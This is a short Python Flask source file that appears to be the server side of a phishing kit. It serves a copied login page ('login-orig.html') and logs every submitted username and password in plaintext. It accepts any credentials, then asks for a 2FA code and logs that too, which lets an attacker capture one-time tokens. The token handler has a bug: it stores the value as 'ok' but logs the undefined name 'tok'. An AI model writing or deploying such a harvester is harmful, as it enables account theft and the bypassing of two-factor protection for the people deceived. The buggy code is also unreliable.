import logging
import sys
import json

from flask import (Flask, render_template, redirect, url_for, request, jsonify)
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login-orig.html')

@app.route('/login', methods=['POST'])
def login():
    data = json.loads(request.data)
    user = data['username']
    pswd = data['password']

    app.logger.info('{} : {}'.format(user, pswd))

    return jsonify({'valid': True, '2fa': True})

@app.route('/token', methods=['POST'])
def twofa():
    data = json.loads(request.data)
    app.logger.info(data)
    ok = data['token']

    app.logger.info('{}'.format(tok))

    return jsonify({'valid': True})

if __name__ == '__main__':
    app.run(debug=True)
